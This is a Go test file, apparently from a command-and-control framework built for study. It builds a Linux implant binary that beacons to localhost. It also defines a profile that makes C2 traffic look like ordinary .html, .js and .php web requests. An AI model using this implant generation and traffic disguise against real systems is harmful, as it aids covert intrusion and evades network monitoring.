package generate

import (
	"testing"

	"xhc2_for_studying/protocol"
	"xhc2_for_studying/server/store"
)

func TestGenerateAndBuildEmbeddedBytesBuildsImplant(t *testing.T) {
	_, serverPubKey, err := protocol.GenerateAgeKeyPair()
	if err != nil {
		t.Fatalf("GenerateAgeKeyPair returned error: %v", err)
	}

	result, err := GenerateAndBuildEmbeddedBytes(
		"http://127.0.0.1:8024",
		"/api/v1",
		5,
		0,
		serverPubKey,
		testProfile(),
		store.NewImplantStore(),
		"linux",
		"amd64",
	)
	if err != nil {
		t.Fatalf("GenerateAndBuildEmbeddedBytes returned error: %v", err)
	}
	if result.Digest == "" {
		t.Fatal("Digest is empty")
	}
	if len(result.Binary) == 0 {
		t.Fatal("Binary is empty")
	}
}

func testProfile() *protocol.C2Profile {
	return &protocol.C2Profile{
		PathSegments: []protocol.HTTPC2PathSegment{
			{Value: "client", IsFile: false},
			{Value: "sync", IsFile: false},
			{Value: "tasks", IsFile: true},
			{Value: "results", IsFile: true},
		},
		KeyExchangeExtensions: []string{".html"},
		RegisterExtensions:    []string{".json"},
		PollExtensions:        []string{".js"},
		ResultExtensions:      []string{".php"},
		MinPathLength:         1,
		MaxPathLength:         2,
		NonceMode:             protocol.NonceModeURLParam,
		EncoderModulus:        256,
	}
}
